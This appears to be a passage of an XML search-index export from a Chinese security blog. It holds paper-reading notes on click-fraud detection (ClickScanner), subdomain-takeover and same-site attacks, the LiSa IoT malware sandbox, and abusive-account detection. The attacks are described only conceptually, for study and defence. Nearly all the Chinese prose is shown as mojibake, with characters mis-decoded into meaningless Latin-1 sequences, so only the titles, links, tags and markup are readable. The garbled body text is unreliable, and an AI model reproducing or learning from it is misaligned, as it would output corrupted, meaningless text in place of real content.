ï¼Œè¯»è€…å‘ç°è¿™ä¸ªæ–¹æ¡ˆæ€è·¯å¾ˆå¥½ï¼Œä½†ä¹Ÿå­˜åœ¨ç€ä¸€äº›é—®é¢˜ï¼Œä¸€æ˜¯æ€ä¹ˆç¡®ä¿å†ç”Ÿæˆçš„ç»„ä»¶èƒ½å¤Ÿå®Œæ•´æ»¡è¶³æºç»„ä»¶çš„æ‰€æœ‰è¾“å…¥ï¼Œåœ¨å…·å¤‡æ­£å¸¸çš„è¡Œä¸ºåŠŸèƒ½çš„æƒ…å†µä¸‹åšåˆ°å®Œå…¨ç›¸åŒçš„è¾“å‡ºï¼›äºŒæ˜¯ä¸Šè¿°å­¦ä¹ è¿‡ç¨‹ä¸­å¦‚æœå‡ºç°äº†å› ä¸ºæ¼æ´æ‰€å¼•èµ·çš„è¾“å…¥å’Œè¾“å‡ºï¼Œé‚£ä¹ˆå…¶ç”Ÿæˆçš„æ‰€è°“æ— æ¼æ´ç‰ˆæœ¬ä¸­å…¶å®ä¹Ÿä¼šå­˜åœ¨å­¦ä¹ è¿‡ç¨‹ä¸­å‡ºç°çš„é‚£ç§æ¼æ´ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CCS&#39;21 </tag>
            
            <tag> Supply Chain Attack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PR - Dissecting Click Fraud Autonomy in the Wild</title>
      <link href="/2021/09/22/Dissecting%20Click%20Fraud%20Autonomy%20in%20the%20Wild/"/>
      <url>/2021/09/22/Dissecting%20Click%20Fraud%20Autonomy%20in%20the%20Wild/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>åŸæ–‡ä½œè€…ï¼šT Zhu, Y Meng, H Hu, X Zhang, M Xue</em></p><p><em>åŸæ–‡æ ‡é¢˜ï¼šDissecting Click Fraud Autonomy in the Wild</em></p><p><em>åŸæ–‡é“¾æ¥ï¼š<a href="https://arxiv.org/pdf/2105.11103.pdf">https://arxiv.org/pdf/2105.11103.pdf</a></em></p><p><em>åŸæ–‡æ¥æºï¼šCCS 2021</em></p><p><em>ç¬”è®°ä½œè€…ï¼šoutx</em></p></blockquote><h2 id="0x01-Intro"><a href="#0x01-Intro" class="headerlink" title="0x01 Intro"></a>0x01 Intro</h2><p>é¦–å…ˆéœ€è¦äº†è§£çš„æ˜¯éšç€æ™ºèƒ½æ‰‹æœºçš„æ™®åŠï¼Œç§»åŠ¨å¹¿å‘Šå¸‚åœºå¿«é€Ÿå‘å±•ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œåº”ç”¨ç¨‹åºå¼€å‘è€…ä¼šå°†å¹¿å‘Šå•†çš„å¹¿å‘ŠåµŒå…¥è‡³ä»–ä»¬çš„APPä¸­ï¼Œç”¨æˆ·ç‚¹å‡»è¿™äº›å¹¿å‘Šåï¼Œå¹¿å‘Šå•†æ ¹æ®å…¶æµé‡å’Œç‚¹å‡»é‡åƒè¿™äº›å¼€å‘è€…ä»˜è´¹ã€‚ä½†è¿™å…¶ä¸­å­˜åœ¨ç€ä¸€äº›å¨èƒï¼Œå³ç‚¹å‡»æ¬ºè¯ˆã€‚ç®€è€Œè¨€ä¹‹ï¼Œå¼€å‘è€…é€šè¿‡ç‚¹å‡»æ¬ºè¯ˆç­–ç•¥ï¼Œæ¨¡æ‹Ÿç”¨æˆ·äº§ç”Ÿè™šå‡çš„å¹¿å‘Šç‚¹å‡»äº‹ä»¶ï¼Œä»¥è·å¾—é¢å¤–çš„å¹¿å‘Šè´¹ã€‚</p><p>ç›®å‰å°šæœ‰çš„ä¸¤ç±»æ–¹æ³•ä¸»è¦æ˜¯é’ˆå¯¹ç”¨æˆ·ç«¯å’Œé’ˆå¯¹å¹¿å‘Šç½‘ç»œç«¯ï¼Œå‰è€…ä¸»è¦æ˜¯æ£€æŸ¥ç‚¹å‡»æ¨¡å¼æ˜¯å¦ç¬¦åˆç‰¹å®šè§„åˆ™æ¥åˆ¤å®šç‚¹å‡»çš„åˆæ³•æ€§ï¼Œåè€…ä¸»è¦æ˜¯é€šè¿‡æµé‡åˆ†ææ¥ç¡®å®šæ˜¯å¦æ˜¯æ¬ºè¯ˆç‚¹å‡»ã€‚ä½†ä¸è®ºè¿™ä¸¤ç§æ–¹æ³•é’ˆå¯¹çš„åœºæ™¯æ˜¯å¦ä¸åŒï¼Œå…¶éƒ½åŸºäºä¸€ä¸ªå‡è®¾ï¼Œå³æ¬ºè¯ˆç‚¹å‡»å’ŒçœŸå®ç”¨æˆ·ç‚¹å‡»çš„æ¨¡å¼æ˜¯æœ‰åŒºåˆ«çš„ã€‚é‚£ä¹ˆï¼Œæ˜¯å¦å­˜åœ¨ä¸€ç§èƒ½å¤Ÿæ¨¡æ‹ŸçœŸå®äººç±»çš„ç‚¹å‡»æ¨¡å¼å¹¶èƒ½ç»•è¿‡ç°æœ‰æ£€æµ‹æ–¹æ¡ˆçš„æ¬ºè¯ˆç‚¹å‡»ç­–ç•¥å‘¢ï¼Ÿ</p><p>æœ¬æ–‡ä¸­ï¼Œä½œè€…å®šä¹‰è¿™ç§æ‹Ÿäººç‚¹å‡»æ¨¡å¼ä¸ºä¸€ç§ç‚¹å‡»æ¬ºè¯ˆç­–ç•¥ï¼ˆä»¥ä¸‹ç®€ç§°ä¸ºæ‹Ÿäººæ”»å‡»ï¼‰ï¼Œå…¶ç‚¹å‡»æ¨¡å¼å’Œæµé‡æ¨¡å¼ä¸çœŸå®çš„äººç±»ç‚¹å‡»å‡ ä¹ç›¸åŒã€‚å…·ä½“æ¥è¯´ï¼Œè¿™ç±»æ¬ºè¯ˆæ€§åº”ç”¨ç¨‹åºå¯èƒ½ä¼šéšæœºåŒ–ç‚¹å‡»åæ ‡/æ—¶é—´é—´éš”ï¼Œç”šè‡³æ˜¯è·ŸéšçœŸå®ç”¨æˆ·çš„åˆæ³•è¡Œä¸ºæ¥äº§ç”Ÿç‚¹å‡»æµé‡ï¼Œä»¥ç»•è¿‡ç›®å‰çš„æ£€æµ‹æ‰‹æ®µã€‚å¯¹è¿™ç±»æ‹Ÿäººæ”»å‡»è¿›è¡Œå¤§è§„æ¨¡é™æ€åˆ†æå­˜åœ¨ç€ä»¥ä¸‹æŠ€æœ¯æŒ‘æˆ˜ï¼š</p><ol><li>å¦‚ä½•é€šè¿‡å®šä¹‰ä¸€ç»„æ–°çš„ç‰¹å¾æ¥åŒºåˆ†ç”Ÿæˆè™šå‡ç‚¹å‡»çš„ä»£ç å’Œç”Ÿæˆåˆæ³•ç‚¹å‡»çš„ä»£ç </li><li>åŸºäºè¿™äº›ç‰¹å¾ï¼Œå¦‚ä½•æ‰èƒ½åœ¨æ­£å¸¸æ ·æœ¬å¾ˆå°‘çš„æƒ…å†µä¸‹æ„å»ºä¸€ä¸ªæ–°ç³»ç»Ÿï¼Œç”¨äºè‡ªåŠ¨æå–è¿™äº›ç‰¹å¾å¹¶å‡†ç¡®è¯†åˆ«æ¬ºè¯ˆåº”ç”¨ç¨‹åº</li></ol><p>ä¸ºäº†åº”å¯¹è¿™äº›æŒ‘æˆ˜ï¼Œä½œè€…æå‡ºäº†ClickScannerï¼Œä¸€ä¸ªè½»é‡çº§çš„é™æ€åˆ†ææ¡†æ¶ï¼Œç”¨äºè‡ªåŠ¨æ£€æµ‹æ‹Ÿäººæ”»å‡»ã€‚æ ¹æ®ç ”ç©¶å‘ç°ï¼Œæ‹Ÿäººæ”»å‡»ä¸»è¦åˆ©ç”¨ä¸‹é¢å››ç§ç­–ç•¥çš„ç»„åˆæ¥ç»•è¿‡æ£€æµ‹ï¼š</p><ol><li>åæ ‡éšæœºåŒ–</li><li>è§¦å‘æ—¶é—´éšæœºåŒ–</li><li>è·Ÿè¸ªçœŸå®ç”¨æˆ·çš„åˆæ³•è¡Œä¸ºç”Ÿæˆè™šå‡ç‚¹å‡»</li><li>é¢„å®šä¹‰åé—¨,ä»è¿œç¨‹æœåŠ¡å™¨æ¥å—ç‚¹å‡»çš„åæ ‡å’Œè§¦å‘æ¡ä»¶å¹¶è‡ªé€‚åº”åœ°é¿å¼€æ£€æµ‹</li></ol><p><strong>æœ¬æ–‡çš„ä¸»è¦è´¡çŒ®ï¼š</strong></p><ol><li>è®¾è®¡å¹¶å®ç°äº†ClickScannerç”¨ä»¥å‰–ææ‹Ÿäººæ”»å‡»</li><li>è®¾è®¡å®éªŒå¹¶è¯æ˜äº†ClickScannerçš„æœ‰æ•ˆæ€§å’Œå…ˆè¿›æ€§</li><li>å‘ç°å¹¶åˆ†æäº†ä¸€äº›ç‚¹å‡»æ¬ºè¯ˆçš„è¶‹åŠ¿å’Œæƒ…å†µ</li></ol><h2 id="0x02-Humanoid-Attack"><a href="#0x02-Humanoid-Attack" class="headerlink" title="0x02 Humanoid Attack"></a>0x02 Humanoid Attack</h2><p>ä½œè€…ä¸ºäº†è¯´æ˜æ‹Ÿäººæ”»å‡»çš„ä¸€äº›ç‰¹æ€§åŠå…¶ä¸ºä»€ä¹ˆèƒ½å¤Ÿç»•è¿‡ä¸€äº›ç°æœ‰æ£€æµ‹åšäº†ä»¥ä¸‹å¯¹æ¯”è¯•éªŒã€‚åœ¨åº”ç”¨ç¨‹åºçš„å¹¿å‘Šæ¨ªå¹…ä¸Šæ˜¾ç¤ºç‚¹å‡»äº‹ä»¶çš„åæ ‡åˆ†å¸ƒå’Œæ—¶é—´æ¨¡å¼ã€‚ä¸‹å›¾ä¸ºç‚¹å‡»äº‹ä»¶è®°å½•ï¼Œå…¶ä¸­fixedè¡¨ç¤ºå›ºå®šç‚¹å‡»ï¼Œreplyè¡¨ç¤ºé‡æ’­ç‚¹å‡»ï¼ŒHumanoidè¡¨ç¤ºæ‹Ÿäººç‚¹å‡»ã€‚</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/acc1c269-a158-4b9e-bfa6-e6786dec50b5.png"></p><p>å¯ä»¥å¾ˆç›´è§‚åœ°å‘ç°ï¼Œä¸è®ºæ˜¯åœ¨åæ ‡åˆ†å¸ƒè¿˜æ˜¯æ—¶é—´æ¨¡å¼ä¸Šï¼Œæ‹Ÿäººç‚¹å‡»æ˜¯æœ€æ¥è¿‘çœŸå®äººç±»ç‚¹å‡»äº‹ä»¶çš„ï¼Œè¿™ä¹Ÿå……åˆ†è¯´æ˜äº†è¿™ä¸€æ”»å‡»æ–¹å¼çš„éšè”½æ€§ã€‚</p><h2 id="0x03-ClickScanner"><a href="#0x03-ClickScanner" class="headerlink" title="0x03 ClickScanner"></a>0x03 ClickScanner</h2><p>é€šè¿‡ä¸Šè¿°åˆ†æï¼Œæˆ‘ä»¬å¾—çŸ¥äº†æ‹Ÿäººæ”»å‡»æ¨¡å¼åœ¨è¡Œä¸ºä¸Šä¸çœŸå®äººç±»ç‚¹å‡»æ˜¯å‡ ä¹æ²¡æœ‰å·®åˆ«çš„ï¼Œé‚£ä¹ˆç°æœ‰çš„æ£€æµ‹æ–¹æ¡ˆåŠ¨æ€åœ°è¿›è¡Œåˆ†ææ˜¯æ•ˆæœå¾ˆå·®çš„ã€‚ä½†æ˜¯ï¼Œå°½ç®¡è¿™äº›æ‹Ÿäººæ”»å‡»åœ¨è¡Œä¸ºä¸Šè¢«ä¼ªè£…ä¸ºåˆæ³•ç‚¹å‡»ï¼Œå…¶åœ¨å­—èŠ‚ç çº§åˆ«åˆæ³•å’Œæ¬ºè¯ˆåº”ç”¨ç¨‹åºä¹‹é—´çš„å¹¿å‘Šç‚¹å‡»è§¦å‘æ¡ä»¶å’Œç”Ÿæˆè¿‡ç¨‹çš„å·®å¼‚æ˜¾è‘—ï¼Œè¿™ä¾¿å¯ä»¥ä½œä¸ºæ£€æµ‹ç‰¹å¾ä¸ºé™æ€æ£€æµ‹æä¾›å¯èƒ½æ€§ã€‚ClickScanneræ„é€ å¦‚ä¸‹å›¾ã€‚<br><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/2f2b2232-52f4-4cda-995b-bac204a59199.png"></p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/0877c1d3-77f8-4cb0-bca3-26be7803107e.png"></p><h2 id="0x04-Conlusion"><a href="#0x04-Conlusion" class="headerlink" title="0x04 Conlusion"></a>0x04 Conlusion</h2><p>æœ¬æ–‡ä¸­ï¼Œä½œè€…é¦–å…ˆä»‹ç»äº†ä¸€ç§ç”¨äºè¯ˆéª—å¹¿å‘Šå•†çš„æ¬ºéª—è¡Œä¸ºï¼Œå³é€šè¿‡è™šæ‹Ÿç”¨æˆ·ç‚¹å‡»äº‹ä»¶ä»å¹¿å‘Šå•†å¤„éæ³•è·åˆ©ã€‚åœ¨åˆ†æäº†ç°æœ‰çš„ä¸¤å¤§ç±»æ£€æµ‹æ–¹æ¡ˆä¹‹åï¼Œä½œè€…æå‡ºäº†ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚æœè¯´å­˜åœ¨ä¸€ç§æ¬ºè¯ˆç­–ç•¥æ˜¯é€šè¿‡æ‹ŸäººåŒ–ç‚¹å‡»å®ç°çš„ï¼Œè¿™ç§æƒ…å†µä¸‹åˆåº”è¯¥å¦‚ä½•æ£€æµ‹å‘¢ï¼Ÿ</p><p>åœ¨æ·±å…¥ç ”ç©¶ä¹‹åï¼Œä½œè€…å‘ç°å¹¶ç»™è¿™ç§é€šè¿‡åæ ‡/æ—¶é—´éšæœºåŒ–ç­‰æ–¹æ³•æ¨¡æ‹ŸçœŸäººç‚¹å‡»äº‹ä»¶çš„æ”»å‡»ç­–ç•¥å‘½åä¸ºæ‹Ÿäººæ”»å‡»ï¼ˆHumanoid Attackï¼‰ï¼Œå¹¶æå‡ºäº†ClickScannerã€‚ClickScannerä»ä¸€äº›å­—èŠ‚ç çº§åˆ«çš„æ–°ç‰¹å¾å‡ºå‘ï¼ŒåŸºäºé™æ€åˆ†ææ„å»ºä¾èµ–å…³ç³»å›¾ï¼ˆDDGï¼‰ï¼Œæå–è¿™äº›å…³é”®ç‰¹å¾ä»¥å½¢æˆç‰¹å¾å‘é‡ã€‚æœ€åï¼Œæ„å»ºäº†ä¸€ä¸ªåŸºäºå˜åˆ†è‡ªåŠ¨ç¼–ç å™¨ï¼ˆVAEï¼‰çš„æœ‰æ•ˆåˆ†ç±»å™¨ï¼Œè¿™ä¸ªåˆ†ç±»å™¨ä¾æ‰˜äºæœ‰é™çš„æ¬ºè¯ˆç¤ºä¾‹çŸ¥è¯†ï¼Œä»¥å…‹æœæ‹Ÿäººæ”»å‡»æ–¹é¢çš„æœ‰é™çŸ¥è¯†ï¼Œæœ‰ç€ä¸é”™çš„æ€§èƒ½å’Œå‡†ç¡®æ€§ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CCS&#39;21 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PR - Can I Take Your Subdomain? Exploring Same-Site Attacks in the Modern Web</title>
      <link href="/2021/09/14/Can%20I%20Take%20Your%20Subdomain%20Exploring%20Same-Site%20Attacks%20in%20the%20Modern%20Web/"/>
      <url>/2021/09/14/Can%20I%20Take%20Your%20Subdomain%20Exploring%20Same-Site%20Attacks%20in%20the%20Modern%20Web/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>åŸæ–‡ä½œè€…ï¼šM Squarcina, M Tempesta, L Veronese</em></p><p><em>åŸæ–‡æ ‡é¢˜ï¼šCan I Take Your Subdomain? Exploring Same-Site Attacks in the Modern Web</em></p><p><em>åŸæ–‡é“¾æ¥ï¼š<a href="https://www.usenix.org/system/files/sec21-squarcina.pdf">https://www.usenix.org/system/files/sec21-squarcina.pdf</a></em></p><p><em>åŸæ–‡æ¥æºï¼šUSENIX Security 2021</em></p><p><em>ç¬”è®°ä½œè€…ï¼šoutx</em></p></blockquote><h2 id="0x01-Intro"><a href="#0x01-Intro" class="headerlink" title="0x01 Intro"></a>0x01 Intro</h2><p>ä½œè€…ä¸»è¦æè¿°äº†ä¸€ç§ç ”ç©¶è€…ä¸å¤ªé‡è§†çš„å®‰å…¨é£é™©ï¼Œå³éƒ¨åˆ†é’ˆå¯¹åŒçº§åŸŸåæ§åˆ¶è€Œäº§ç”Ÿçš„ç ´åcookieå®‰å…¨çš„å¨èƒéšæ‚£ï¼Œå¹¶é‡æ–°å®¡è§†äº†è¿™ä¸€ç±»å¨èƒï¼Œå¹¶åˆ†æäº†ç›¸å…³åŸŸæ”»å‡»è€…æ‰€å¸¦æ¥çš„å®‰å…¨æ€§å±å®³ï¼Œä¸»è¦æ˜¯ä»ï¼š</p><ol><li>å¼•å…¥äº†ç›¸å…³åŸŸæ”»å‡»è€…çš„ç»†ç²’åº¦å®šä¹‰ï¼Œä¸»è¦æ˜¯æ ¹æ®æ”»å‡»è€…å‘èµ·æ”»å‡»çš„ä½ç½®åŠå…¶ä¸å®‰å…¨å¨èƒçš„å…³è”æ€§è¿›è¡Œåˆ†æï¼Œæ‹†è§£æ”»å‡»è€…çš„æ”»å‡»èƒ½åŠ›ï¼Œå¹¶è¯„ä¼°è¿™äº›æ”»å‡»èƒ½åŠ›æ‰€å¯¹åº”çš„webæ”»å‡»æ¡ä»¶</li><li>å®ç°äº†ä¸€ä¸ªå·¥å…·ç”¨äºè¯„ä¼°ç›¸å…³åŸŸæ”»å‡»è€…å¯èƒ½å¯¹webåº”ç”¨ç¨‹åºå®‰å…¨é€ æˆçš„å½±å“</li></ol><blockquote><p>è¡¥å……çŸ¥è¯†</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/c2abe24f-24b3-4cf7-acbf-8e6c84d1f491.png"></p></blockquote><h2 id="0x02-Threat-Model"><a href="#0x02-Threat-Model" class="headerlink" title="0x02 Threat Model"></a>0x02 Threat Model</h2><h3 id="æ‚¬ç©ºDNSè®°å½•"><a href="#æ‚¬ç©ºDNSè®°å½•" class="headerlink" title="æ‚¬ç©ºDNSè®°å½•"></a>æ‚¬ç©ºDNSè®°å½•</h3><p>æŒ‡åŸŸçš„æƒå¨DNSæœåŠ¡å™¨ä¸­æŒ‡å‘è¿‡æœŸèµ„æºçš„è®°å½•</p><ul><li>è¿‡æœŸçš„åŸŸåï¼šDNS CNAMEè®°å½•å°†ä¸€ä¸ªåŸŸå(åˆ«å)æ˜ å°„åˆ°å¦ä¸€ä¸ªç§°ä¸ºè§„èŒƒåç§°çš„åŸŸåã€‚å¦‚æœè§„èŒƒåç§°è¿‡æœŸï¼Œæ”»å‡»è€…å¯ä»¥è½»æ¾æ³¨å†Œè¯¥åŸŸï¼Œå¹¶åœ¨åˆ«ååŸŸä¸‹æä¾›ä»»æ„å†…å®¹ã€‚</li><li>åœæ­¢æä¾›çš„æœåŠ¡ï¼šç¬¬ä¸‰æ–¹æœåŠ¡å¸¸å¸¸ç”¨äºæ‰©å±•ç½‘ç«™çš„åŠŸèƒ½ï¼Œå°±å¥½åƒblog.example.comä»£è¡¨ä¸€ä¸ªwordpressåšå®¢ï¼Œä½†æ˜¯å¦‚æœæœåŠ¡æä¾›å•†æ²¡æœ‰æ˜ç¡®éªŒè¯åŸŸæ‰€æœ‰æƒï¼Œæ”»å‡»è€…å¯ä»¥æŠŠä»»ä½•å…·æœ‰æœ‰æ•ˆDNSè®°å½•çš„å­åŸŸæ˜ å°„åˆ°è‡ªå·±çš„è´¦æˆ·ã€‚åŠ ä¹‹ï¼Œç«™ç‚¹ç®¡ç†å‘˜é€šå¸¸ä¼šä½¿ç”¨é€šé…ç¬¦æ¥ç®€åŒ–é…ç½®è¿‡ç¨‹ï¼Œè¿™å°±é€ æˆäº†æ”»å‡»è€…å¯ä»¥ç»‘å®šä¸€äº›è‡ªå®šä¹‰çš„å­åŸŸã€‚</li><li>å·²å»é™¤çš„äº‘å®ä¾‹ï¼šä¸»è¦æŒ‡çš„æ˜¯åˆ©ç”¨é‚£äº›äº‘ä¸­å¯ç”¨çš„æ‚¬ç©ºDNSè®°å½•ã€‚</li></ul><h3 id="åŠ¨æ€DNSæœåŠ¡"><a href="#åŠ¨æ€DNSæœåŠ¡" class="headerlink" title="åŠ¨æ€DNSæœåŠ¡"></a>åŠ¨æ€DNSæœåŠ¡</h3><p>è®¸å¤šæœåŠ¡æä¾›å•†å…è®¸ç”¨æˆ·åœ¨ç‰¹å®šå­åŸŸä¸‹åˆ›å»ºç½‘ç«™ï¼Œä¾‹å¦‚githubä¸Šçš„&lt;username&gt;.github.ioã€‚å¦‚æœPSLä¸­åŒ…å«çˆ¶åŸŸï¼Œåˆ™æ‰¿è½½ç”¨æˆ·æä¾›çš„å†…å®¹çš„å­åŸŸå½¼æ­¤ä¸ç›¸å…³ï¼Œå¦‚github.io</p><h3 id="å·²æ²¦é™·ä¸»æœº"><a href="#å·²æ²¦é™·ä¸»æœº" class="headerlink" title="å·²æ²¦é™·ä¸»æœº"></a>å·²æ²¦é™·ä¸»æœº</h3><p>æ”»å‡»å¯ç”¨ä¸€äº›è„†å¼±çš„æœåŠ¡ç›´æ¥å¯¹ä¸»æœºå‘èµ·æ”»å‡»ï¼Œç„¶åä»ä¸€ä¸ªç‰¹æƒä½ç½®å¼€å§‹å¯¹ä¸€ä¸ªæ›´åŠ æ•æ„Ÿçš„ç½‘ç«™è¿›è¡Œæ”»å‡»</p><h2 id="0x03-Analysis-Methodology"><a href="#0x03-Analysis-Methodology" class="headerlink" title="0x03 Analysis Methodology"></a>0x03 Analysis Methodology</h2><h3 id="è¿‡æœŸåŸŸå"><a href="#è¿‡æœŸåŸŸå" class="headerlink" title="è¿‡æœŸåŸŸå"></a>è¿‡æœŸåŸŸå</h3><p>ç»™å®šä¸€ä¸ªä»¥CNAMEè®°å½•å¼€å¤´çš„è§£æé“¾ï¼Œæ£€æŸ¥å…¶æ˜¯å¦æŒ‡å‘ä¸€ä¸ªæ— æ³•è§£æçš„èµ„æºï¼Œå¹¶æå–é“¾æœ«ç«¯è§„èŒƒåç§°çš„eTLD+1ã€‚å¦‚æœæ ¹åŸŸä¸Šçš„whoisæ²¡æœ‰åŒ¹é…ç»“æœçš„è¯ï¼Œç›´æ¥æŸ¥è¯¢GoDaddyæ£€æµ‹æ˜¯å¦å¯ä»¥ç›´æ¥è´­ä¹°è¯¥åŸŸåã€‚</p><h3 id="åœæ­¢æä¾›çš„æœåŠ¡"><a href="#åœæ­¢æä¾›çš„æœåŠ¡" class="headerlink" title="åœæ­¢æä¾›çš„æœåŠ¡"></a>åœæ­¢æä¾›çš„æœåŠ¡</h3><p>ç›´æ¥å°è¯•è§£æ&lt;none&gt;.test.example.comçš„CNAMEæˆ–DNSè®°å½•ï¼Œå°±å¯ä»¥æ£€æµ‹test.example.comçš„DNSé€šé…ç¬¦ï¼Œç¡®å®šå®‰å…¨æ€§ï¼Œå…¶ä¸­noneä¸ºå®Œå…¨éšæœºçš„å­—ç¬¦ä¸²</p><h3 id="å·²å»é™¤çš„äº‘å®ä¾‹"><a href="#å·²å»é™¤çš„äº‘å®ä¾‹" class="headerlink" title="å·²å»é™¤çš„äº‘å®ä¾‹"></a>å·²å»é™¤çš„äº‘å®ä¾‹</h3><p>é¦–å…ˆæµ‹è¯•äº†æ•°æ®é›†ä¸­çš„æ¯ä¸ª(å­)åŸŸï¼Œä»¥æ£€æŸ¥æŒ‡å‘çš„IPæ˜¯å¦åŒ…å«åœ¨ä»»ä½•äº‘IPèŒƒå›´ä¸­ã€‚ä¸»è¦æ˜¯é€šè¿‡pingä¸€ä¸ªIPæ˜¯æ¥åˆ¤æ–­è¿™ä¸ªIPæ˜¯å¦å­˜æ´»ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> USENIX Security&#39;21 </tag>
            
            <tag> Domain </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PR - LiSa - Multiplatform Linux Sandbox for Analyzing IoT Malware</title>
      <link href="/2021/08/31/LiSa%20-%20Multiplatform%20Linux%20Sandbox%20for%20Analyzing%20IoT%20Malware/"/>
      <url>/2021/08/31/LiSa%20-%20Multiplatform%20Linux%20Sandbox%20for%20Analyzing%20IoT%20Malware/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>åŸæ–‡ä½œè€…ï¼šD UhrÄ±cek</em></p><p><em>åŸæ–‡æ ‡é¢˜ï¼šLiSa - Multiplatform Linux Sandbox for Analyzing IoT Malware</em></p><p><em>åŸæ–‡é“¾æ¥ï¼š<a href="http://excel.fit.vutbr.cz/submissions/2019/058/58.pdf">http://excel.fit.vutbr.cz/submissions/2019/058/58.pdf</a></em></p><p><em>åŸæ–‡æ¥æºï¼š2020 - excel.fit.vutbr.cz</em></p><p><em>ç¬”è®°ä½œè€…ï¼šoutx</em></p></blockquote><h2 id="0x01-Introduction"><a href="#0x01-Introduction" class="headerlink" title="0x01 Introduction"></a>0x01 Introduction</h2><p>ç›®å‰é’ˆå¯¹Windowså¹³å°çš„æ²™ç®±å·²ç»è¾ƒæˆç†Ÿï¼Œä¾‹å¦‚çƒ­é—¨çš„Cuckooã€‚è€ŒLinuxä¸‹æœ‰Limon/REMnux/Padawanç­‰ï¼Œä½†è¿™äº›åˆ†æè½¯ä»¶æˆ–å¤šæˆ–å°‘å—åˆ°é™åˆ¶ã€‚ä½œè€…æå‡ºäº†ä¸€ä¸ªæ–°çš„äº§å“-LiSaï¼Œæä¾›äº†å®Œæ•´çš„åˆ†æç¯å¢ƒï¼ŒåŒ…å«é™æ€ã€åŠ¨æ€å’Œç½‘ç»œåˆ†æã€åŒæ—¶è¿˜èƒ½åˆ©ç”¨yaraã€jsonç¼–å†™è§„åˆ™è¿›è¡Œæ‰©å±•ã€‚</p><h2 id="0x02-Program-Tracing"><a href="#0x02-Program-Tracing" class="headerlink" title="0x02 Program Tracing"></a>0x02 Program Tracing</h2><p>ä½œè€…åˆ©ç”¨straceå·¥å…·è¿›è¡Œç³»ç»Ÿè°ƒç”¨çš„è¿½è¸ªã€‚è¿™ä¸ªå·¥å…·å¿½ç•¥ç”¨æˆ·çº§çš„è°ƒç”¨è€Œä¸“æ³¨äºå†…æ ¸çº§çš„è¿½è¸ªã€‚</p><h2 id="0x03-Implementation"><a href="#0x03-Implementation" class="headerlink" title="0x03 Implementation"></a>0x03 Implementation</h2><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/09324eb4-652f-453d-9939-1421d2382525.png"></p><p>ä¸»è¦å®ç°æ–¹æ³•ï¼š</p><ul><li>Pythonï¼ˆæ¨¡å—åŒ–ç³»ç»Ÿã€åˆ†æç”¨çš„Pipelineã€Web APIï¼‰</li><li>bashï¼ˆæ„å»ºç³»ç»Ÿï¼‰</li><li>C++ï¼ˆè§£æç½‘ç»œæ•°æ®ï¼‰</li></ul><p>ç®€è€Œè¨€ä¹‹ï¼Œæ˜¯é‡‡ç”¨hook syscallçš„æ–¹å¼æ¥è¿›è¡Œè¿½è¸ªã€‚è€Œæ„é€ æ²™ç›’çš„æ–¹å¼åˆ™æ˜¯åˆ©ç”¨äº†DockeræŠ€æœ¯ï¼Œç»Ÿä¸€ç®¡ç†åˆ™æ˜¯ç”¨äº†Docker composeã€‚</p><h2 id="0x03-Conclusion"><a href="#0x03-Conclusion" class="headerlink" title="0x03 Conclusion"></a>0x03 Conclusion</h2><p>æ€»çš„æ¥è¯´ï¼Œä½œè€…çš„æ€è·¯å’Œæˆ‘æ‹Ÿå®šçš„è®ºæ–‡æ‰©å±•æ€è·¯ç±»ä¼¼ï¼Œé¦–å…ˆæ„å»ºè™šæ‹Ÿç¯å¢ƒï¼Œç„¶ååœ¨è™šæ‹Ÿç¯å¢ƒä¸­è¿›è¡Œè¿›ç¨‹è¿½è¸ª(åˆ©ç”¨strace)ï¼Œä»¥ç¡®å®šè¿›ç¨‹è¡Œä¸ºã€‚æœ€åï¼Œç»“åˆé¢„å®šçš„è¡Œä¸ºç»„åˆåˆ¤æ–­åŒ…çš„æ¶æ„æ€§ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Malware Detection </tag>
            
            <tag> Trace Syscall </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PR - Deep entity classification: Abusive account detection for online social networks</title>
      <link href="/2021/08/09/Deep%20entity%20classification%20-%20Abusive%20account%20detection%20for%20online%20social%20networks/"/>
      <url>/2021/08/09/Deep%20entity%20classification%20-%20Abusive%20account%20detection%20for%20online%20social%20networks/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>åŸæ–‡ä½œè€…ï¼šT Xu, G Goossen, HK Cevahir, S Khodeir, Y Jin</em></p><p><em>åŸæ–‡æ ‡é¢˜ï¼šDeep entity classification: Abusive account detection for online social networks</em></p><p><em>åŸæ–‡é“¾æ¥ï¼š<a href="https://www.usenix.org/system/files/sec21summer_xu.pdf">https://www.usenix.org/system/files/sec21summer_xu.pdf</a></em></p><p><em>åŸæ–‡æ¥æºï¼šUSENIX Security 2021</em></p><p><em>ç¬”è®°ä½œè€…ï¼šoutx</em></p></blockquote><h2 id="0x01-Introduction"><a href="#0x01-Introduction" class="headerlink" title="0x01 Introduction"></a>0x01 Introduction</h2><p>åœ¨çº¿ç¤¾äº¤ç½‘ç»œä¸­å­˜åœ¨ç€ä¸€äº›è´¦æˆ·è¢«æ»¥ç”¨çš„æƒ…å†µï¼Œä½œè€…ä»¥æ­¤æå‡ºäº†Deep Entity Classification(DEC)ï¼Œä¸»è¦æ˜¯ä»æ›´æ·±å±‚æ¬¡ä¸Šæ£€æµ‹é‚£äº›èƒ½å¤Ÿè§„é¿ä¼ 